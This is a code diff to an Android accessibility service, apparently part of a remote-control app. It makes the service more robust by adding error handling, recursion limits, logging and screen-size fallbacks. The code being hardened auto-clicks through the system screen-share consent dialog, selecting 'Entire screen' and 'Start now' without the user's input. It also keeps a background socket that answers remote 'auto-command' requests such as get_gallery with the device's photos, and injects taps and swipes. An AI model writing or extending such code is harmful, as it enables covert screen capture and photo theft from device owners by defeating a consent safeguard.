@@ -35,13 +35,20 @@ public class RemoteAccessibilityService extends AccessibilityService {
         if (!sAutoAcceptPending || attempt > 25) return;
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             if (!sAutoAcceptPending) return;
+            android.view.accessibility.AccessibilityNodeInfo root = null;
             try {
-                android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
+                root = getRootInActiveWindow();
                 if (root != null) {
                     processMediaProjectionDialog(root);
-                    root.recycle();
                 }
-            } catch (Exception ignored) {}
+            } catch (Throwable ignored) {
+            } finally {
+                if (root != null) {
+                    try {
+                        root.recycle();
+                    } catch (Throwable ignored) {}
+                }
+            }
             if (sAutoAcceptPending) {
                 scheduleAutoAcceptCheck(attempt + 1);
             }
@@ -113,7 +120,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
     public void onServiceConnected() {
         super.onServiceConnected();
         sInstance = this;
-        Log.i(TAG, "Remote Accessibility Service Connected and Ready.");
+        AppLog.i(TAG, "Remote Accessibility Service Connected and Ready.");
         acquireLocks();
         initBackgroundSocket();
         mWatchdogHandler.postDelayed(mWatchdogRunnable, 5000);
@@ -132,6 +139,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
                 mWifiLock.release();
             }
             if (mBgSocket != null) {
+                AppLogs.unregisterSocket(mBgSocket);
                 mBgSocket.disconnect();
                 mBgSocket.close();
             }
@@ -150,14 +158,15 @@ public class RemoteAccessibilityService extends AccessibilityService {
             opts.transports = new String[]{"websocket", "polling"};
 
             mBgSocket = IO.socket(APP_URL, opts);
+            AppLogs.registerSocket(mBgSocket);
 
             mBgSocket.on(Socket.EVENT_CONNECT, args -> {
-                Log.i(TAG, "Background Accessibility Socket Connected.");
+                AppLog.i(TAG, "Background Accessibility Socket Connected.");
                 registerDeviceBackground();
             });
 
             mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
-                Log.w(TAG, "Background Accessibility Socket Disconnected.");
+                AppLog.w(TAG, "Background Accessibility Socket Disconnected.");
             });
 
             mBgSocket.on("auto-command", args -> {
@@ -171,7 +180,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
                     long mediaId = data.optLong("mediaId", -1);
                     String mediaType = data.optString("mediaType", "image");
 
-                    Log.i(TAG, "Background auto-command received: " + command + " from " + caller);
+                    AppLog.i(TAG, "Background auto-command received: " + command + " from " + caller);
 
                     if ("get_gallery".equals(command)) {
                         MediaBridge.getGalleryPage(this, page, mBgSocket, fromSocketId);
@@ -294,150 +303,210 @@ public class RemoteAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (!sAutoAcceptPending) return;
+        if (!sAutoAcceptPending || event == null) return;
 
-        int eventType = event.getEventType();
-        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-            eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+        try {
+            int eventType = event.getEventType();
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
-            android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                processMediaProjectionDialog(root);
-                root.recycle();
+                android.view.accessibility.AccessibilityNodeInfo root = null;
+                try {
+                    root = getRootInActiveWindow();
+                    if (root != null) {
+                        processMediaProjectionDialog(root);
+                    }
+                } catch (Throwable t) {
+                    Log.e(TAG, "Error inspecting root in onAccessibilityEvent", t);
+                } finally {
+                    if (root != null) {
+                        try {
+                            root.recycle();
+                        } catch (Throwable ignored) {}
+                    }
+                }
             }
+        } catch (Throwable t) {
+            Log.e(TAG, "onAccessibilityEvent error", t);
         }
     }
 
     private void processMediaProjectionDialog(android.view.accessibility.AccessibilityNodeInfo root) {
-        if (root == null) return;
+        if (root == null || !sAutoAcceptPending) return;
 
-        // Step 1: If there is an option or radio for "Entire screen", select it!
-        boolean entireScreenFound = clickEntireScreenOption(root);
+        try {
+            // Step 1: If there is an option or radio for "Entire screen", select it!
+            boolean entireScreenFound = clickEntireScreenOption(root, 0);
 
-        // Step 2: In Android 14, default is often "Single app". If spinner is showing single app, click it to open dropdown
-        if (!entireScreenFound) {
-            boolean opened = clickSingleAppSpinner(root);
-            if (opened) {
-                // Dropdown will trigger next window event where Entire Screen item will be selected
-                return;
+            // Step 2: In Android 14, default is often "Single app". If spinner is showing single app, click it to open dropdown
+            if (!entireScreenFound) {
+                boolean opened = clickSingleAppSpinner(root, 0);
+                if (opened) {
+                    // Dropdown will trigger next window event where Entire Screen item will be selected
+                    return;
+                }
             }
-        }
 
-        // Step 3: Click "Start now" button
-        boolean started = findAndClickStartButton(root);
-        if (started) {
-            sAutoAcceptPending = false;
-            Log.i(TAG, "Successfully auto-accepted entire screen share dialog!");
+            // Step 3: Click "Start now" button
+            boolean started = findAndClickStartButton(root, 0);
+            if (started) {
+                sAutoAcceptPending = false;
+                Log.i(TAG, "Successfully auto-accepted entire screen share dialog!");
+            }
+        } catch (Throwable t) {
+            Log.e(TAG, "processMediaProjectionDialog error", t);
         }
     }
 
-    private boolean clickEntireScreenOption(android.view.accessibility.AccessibilityNodeInfo node) {
-        if (node == null) return false;
+    private boolean clickEntireScreenOption(android.view.accessibility.AccessibilityNodeInfo node, int depth) {
+        if (node == null || depth > 12) return false;
 
-        CharSequence text = node.getText();
-        CharSequence desc = node.getContentDescription();
-        String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
+        try {
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
 
-        if (!candidate.isEmpty()) {
-            if (candidate.contains("entire screen") || candidate.contains("whole screen") || candidate.contains("full screen") || candidate.contains("all screen") || candidate.equals("entire")) {
-                if (node.isClickable()) {
-                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                    Log.i(TAG, "Selected 'Entire screen' option!");
-                    return true;
-                } else if (node.getParent() != null && node.getParent().isClickable()) {
-                    node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                    Log.i(TAG, "Selected 'Entire screen' option via parent!");
-                    return true;
+            if (!candidate.isEmpty()) {
+                if (candidate.contains("entire screen") || candidate.contains("whole screen") || candidate.contains("full screen") || candidate.contains("all screen") || candidate.equals("entire")) {
+                    if (node.isClickable()) {
+                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                        Log.i(TAG, "Selected 'Entire screen' option!");
+                        return true;
+                    } else if (node.getParent() != null && node.getParent().isClickable()) {
+                        node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                        Log.i(TAG, "Selected 'Entire screen' option via parent!");
+                        return true;
+                    }
                 }
             }
-        }
 
-        int count = node.getChildCount();
-        for (int i = 0; i < count; i++) {
-            android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                boolean clicked = clickEntireScreenOption(child);
-                child.recycle();
-                if (clicked) return true;
+            int count = node.getChildCount();
+            for (int i = 0; i < count; i++) {
+                android.view.accessibility.AccessibilityNodeInfo child = null;
+                try {
+                    child = node.getChild(i);
+                    if (child != null) {
+                        boolean clicked = clickEntireScreenOption(child, depth + 1);
+                        if (clicked) return true;
+                    }
+                } catch (Throwable t) {
+                    Log.w(TAG, "Error in clickEntireScreenOption child", t);
+                } finally {
+                    if (child != null) {
+                        try {
+                            child.recycle();
+                        } catch (Throwable ignored) {}
+                    }
+                }
             }
+        } catch (Throwable t) {
+            Log.e(TAG, "clickEntireScreenOption error at depth " + depth, t);
         }
         return false;
     }
 
-    private boolean clickSingleAppSpinner(android.view.accessibility.AccessibilityNodeInfo node) {
-        if (node == null) return false;
+    private boolean clickSingleAppSpinner(android.view.accessibility.AccessibilityNodeInfo node, int depth) {
+        if (node == null || depth > 12) return false;
 
-        CharSequence text = node.getText();
-        CharSequence desc = node.getContentDescription();
-        String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
+        try {
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
 
-        if (!candidate.isEmpty()) {
-            if (candidate.contains("single app") || candidate.contains("a single app") || candidate.contains("an app")) {
+            if (!candidate.isEmpty()) {
+                if (candidate.contains("single app") || candidate.contains("a single app") || candidate.contains("an app")) {
+                    if (node.isClickable()) {
+                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                        Log.i(TAG, "Clicked single app spinner to show Entire screen option!");
+                        return true;
+                    } else if (node.getParent() != null && node.getParent().isClickable()) {
+                        node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                        Log.i(TAG, "Clicked single app spinner via parent!");
+                        return true;
+                    }
+                }
+            }
+
+            String viewId = node.getViewIdResourceName();
+            if (viewId != null && (viewId.contains("screen_share_mode_spinner") || viewId.contains("spinner"))) {
                 if (node.isClickable()) {
                     node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                    Log.i(TAG, "Clicked single app spinner to show Entire screen option!");
-                    return true;
-                } else if (node.getParent() != null && node.getParent().isClickable()) {
-                    node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                    Log.i(TAG, "Clicked single app spinner via parent!");
                     return true;
                 }
             }
-        }
 
-        String viewId = node.getViewIdResourceName();
-        if (viewId != null && (viewId.contains("screen_share_mode_spinner") || viewId.contains("spinner"))) {
-            if (node.isClickable()) {
-                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                return true;
+            int count = node.getChildCount();
+            for (int i = 0; i < count; i++) {
+                android.view.accessibility.AccessibilityNodeInfo child = null;
+                try {
+                    child = node.getChild(i);
+                    if (child != null) {
+                        boolean clicked = clickSingleAppSpinner(child, depth + 1);
+                        if (clicked) return true;
+                    }
+                } catch (Throwable t) {
+                    Log.w(TAG, "Error in clickSingleAppSpinner child", t);
+                } finally {
+                    if (child != null) {
+                        try {
+                            child.recycle();
+                        } catch (Throwable ignored) {}
+                    }
+                }
             }
-        }
-
-        int count = node.getChildCount();
-        for (int i = 0; i < count; i++) {
-            android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                boolean clicked = clickSingleAppSpinner(child);
-                child.recycle();
-                if (clicked) return true;
-            }
+        } catch (Throwable t) {
+            Log.e(TAG, "clickSingleAppSpinner error at depth " + depth, t);
         }
         return false;
     }
 
-    private boolean findAndClickStartButton(android.view.accessibility.AccessibilityNodeInfo node) {
-        if (node == null) return false;
+    private boolean findAndClickStartButton(android.view.accessibility.AccessibilityNodeInfo node, int depth) {
+        if (node == null || depth > 12) return false;
 
-        CharSequence text = node.getText();
-        CharSequence desc = node.getContentDescription();
-        String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
+        try {
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();
 
-        if (!candidate.isEmpty()) {
-            if (candidate.equals("start now") || candidate.equals("start") || candidate.equals("start recording") ||
-                candidate.equals("allow") || candidate.contains("start now") || candidate.contains("start recording")) {
+            if (!candidate.isEmpty()) {
+                if (candidate.equals("start now") || candidate.equals("start") || candidate.equals("start recording") ||
+                    candidate.equals("allow") || candidate.contains("start now") || candidate.contains("start recording")) {
+                    if (node.isClickable()) {
+                        return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                    } else if (node.getParent() != null && node.getParent().isClickable()) {
+                        return node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                }
+            }
+
+            String viewId = node.getViewIdResourceName();
+            if (viewId != null && (viewId.endsWith("button1") || viewId.endsWith("confirm"))) {
                 if (node.isClickable()) {
                     return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                } else if (node.getParent() != null && node.getParent().isClickable()) {
-                    return node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                 }
             }
-        }
 
-        String viewId = node.getViewIdResourceName();
-        if (viewId != null && (viewId.endsWith("button1") || viewId.endsWith("confirm"))) {
-            if (node.isClickable()) {
-                return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+            int childCount = node.getChildCount();
+            for (int i = 0; i < childCount; i++) {
+                android.view.accessibility.AccessibilityNodeInfo child = null;
+                try {
+                    child = node.getChild(i);
+                    if (child != null) {
+                        boolean clicked = findAndClickStartButton(child, depth + 1);
+                        if (clicked) return true;
+                    }
+                } catch (Throwable t) {
+                    Log.w(TAG, "Error in findAndClickStartButton child", t);
+                } finally {
+                    if (child != null) {
+                        try {
+                            child.recycle();
+                        } catch (Throwable ignored) {}
+                    }
+                }
             }
-        }
-
-        int childCount = node.getChildCount();
-        for (int i = 0; i < childCount; i++) {
-            android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                boolean clicked = findAndClickStartButton(child);
-                child.recycle();
-                if (clicked) return true;
-            }
+        } catch (Throwable t) {
+            Log.e(TAG, "findAndClickStartButton error at depth " + depth, t);
         }
         return false;
     }
@@ -459,10 +528,21 @@ public class RemoteAccessibilityService extends AccessibilityService {
             WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
             if (wm != null && wm.getDefaultDisplay() != null) {
                 wm.getDefaultDisplay().getRealMetrics(metrics);
-                return metrics;
+                if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
+                    return metrics;
+                }
             }
-        } catch (Exception ignored) {}
-        return getResources().getDisplayMetrics();
+        } catch (Throwable ignored) {}
+        try {
+            DisplayMetrics dm = getResources().getDisplayMetrics();
+            if (dm != null && dm.widthPixels > 0 && dm.heightPixels > 0) {
+                return dm;
+            }
+        } catch (Throwable ignored) {}
+        DisplayMetrics fallback = new DisplayMetrics();
+        fallback.widthPixels = 1080;
+        fallback.heightPixels = 1920;
+        return fallback;
     }
 
     /**
@@ -471,40 +551,34 @@ public class RemoteAccessibilityService extends AccessibilityService {
     public boolean performTap(float normX, float normY) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
         try {
-            if (Float.isNaN(normX) || Float.isInfinite(normX) || Float.isNaN(normY) || Float.isInfinite(normY)) {
+            if (!Float.isFinite(normX) || !Float.isFinite(normY)) {
                 return false;
             }
             float safeX = Math.max(0.0f, Math.min(1.0f, normX));
             float safeY = Math.max(0.0f, Math.min(1.0f, normY));
 
             DisplayMetrics metrics = getRealScreenMetrics();
-            float x = safeX * metrics.widthPixels;
-            float y = safeY * metrics.heightPixels;
+            int width = (metrics != null && metrics.widthPixels > 0) ? metrics.widthPixels : 1080;
+            int height = (metrics != null && metrics.heightPixels > 0) ? metrics.heightPixels : 1920;
+
+            float x = safeX * width;
+            float y = safeY * height;
 
             Path path = new Path();
             path.moveTo(x, y);
-            path.lineTo(x, y + 1f);
+            path.lineTo(x, y + 1.0f);
 
             GestureDescription.StrokeDescription stroke =
-                    new GestureDescription.StrokeDescription(path, 0, 60);
+                    new GestureDescription.StrokeDescription(path, 0, 50);
 
             GestureDescription.Builder builder = new GestureDescription.Builder();
             builder.addStroke(stroke);
 
-            Handler mainHandler = new Handler(Looper.getMainLooper());
-            return dispatchGesture(builder.build(), new GestureResultCallback() {
-                @Override
-                public void onCompleted(GestureDescription gestureDescription) {
-                    Log.d(TAG, "Tap completed at: (" + x + ", " + y + ")");
-                }
-
-                @Override
-                public void onCancelled(GestureDescription gestureDescription) {
-                    Log.w(TAG, "Tap cancelled at: (" + x + ", " + y + ")");
-                }
-            }, mainHandler);
+            // Pass null callback and null handler to prevent circular references and handler queue explosion
+            AppLog.i(TAG, "performTap injected at: (" + (int) x + ", " + (int) y + ")");
+            return dispatchGesture(builder.build(), null, null);
         } catch (Throwable t) {
-            Log.e(TAG, "performTap error", t);
+            AppLog.e(TAG, "performTap error", t);
             return false;
         }
     }
@@ -515,10 +589,8 @@ public class RemoteAccessibilityService extends AccessibilityService {
     public boolean performSwipe(float startNormX, float startNormY, float endNormX, float endNormY, long durationMs) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
         try {
-            if (Float.isNaN(startNormX) || Float.isInfinite(startNormX) ||
-                Float.isNaN(startNormY) || Float.isInfinite(startNormY) ||
-                Float.isNaN(endNormX) || Float.isInfinite(endNormX) ||
-                Float.isNaN(endNormY) || Float.isInfinite(endNormY)) {
+            if (!Float.isFinite(startNormX) || !Float.isFinite(startNormY) ||
+                !Float.isFinite(endNormX) || !Float.isFinite(endNormY)) {
                 return false;
             }
             float safeStartX = Math.max(0.0f, Math.min(1.0f, startNormX));
@@ -527,53 +599,59 @@ public class RemoteAccessibilityService extends AccessibilityService {
             float safeEndY = Math.max(0.0f, Math.min(1.0f, endNormY));
 
             DisplayMetrics metrics = getRealScreenMetrics();
-            float x1 = safeStartX * metrics.widthPixels;
-            float y1 = safeStartY * metrics.heightPixels;
-            float x2 = safeEndX * metrics.widthPixels;
-            float y2 = safeEndY * metrics.heightPixels;
+            int width = (metrics != null && metrics.widthPixels > 0) ? metrics.widthPixels : 1080;
+            int height = (metrics != null && metrics.heightPixels > 0) ? metrics.heightPixels : 1920;
+
+            float x1 = safeStartX * width;
+            float y1 = safeStartY * height;
+            float x2 = safeEndX * width;
+            float y2 = safeEndY * height;
 
             Path path = new Path();
             path.moveTo(x1, y1);
             path.lineTo(x2, y2);
 
-            long duration = durationMs > 0 ? durationMs : 250;
+            long duration = Math.max(100L, Math.min(1000L, durationMs > 0 ? durationMs : 250L));
             GestureDescription.StrokeDescription stroke =
                     new GestureDescription.StrokeDescription(path, 0, duration);
 
             GestureDescription.Builder builder = new GestureDescription.Builder();
             builder.addStroke(stroke);
 
-            Handler mainHandler = new Handler(Looper.getMainLooper());
-            return dispatchGesture(builder.build(), null, mainHandler);
+            AppLog.i(TAG, "performSwipe injected: (" + (int) x1 + "," + (int) y1 + ") -> (" + (int) x2 + "," + (int) y2 + ")");
+            return dispatchGesture(builder.build(), null, null);
         } catch (Throwable t) {
-            Log.e(TAG, "performSwipe error", t);
+            AppLog.e(TAG, "performSwipe error", t);
             return false;
         }
     }
 
     public boolean performBack() {
         try {
+            AppLog.i(TAG, "performBack injected");
             return performGlobalAction(GLOBAL_ACTION_BACK);
         } catch (Throwable t) {
-            Log.e(TAG, "performBack error", t);
+            AppLog.e(TAG, "performBack error", t);
             return false;
         }
     }
 
     public boolean performHome() {
         try {
+            AppLog.i(TAG, "performHome injected");
             return performGlobalAction(GLOBAL_ACTION_HOME);
         } catch (Throwable t) {
-            Log.e(TAG, "performHome error", t);
+            AppLog.e(TAG, "performHome error", t);
             return false;
         }
     }
 
     public boolean performRecentApps() {
         try {
+            AppLog.i(TAG, "performRecentApps injected");
             return performGlobalAction(GLOBAL_ACTION_RECENTS);
         } catch (Throwable t) {
-            Log.e(TAG, "performRecentApps error", t);
+            AppLog.e(TAG, "performRecentApps error", t);
             return false;
         }
     }
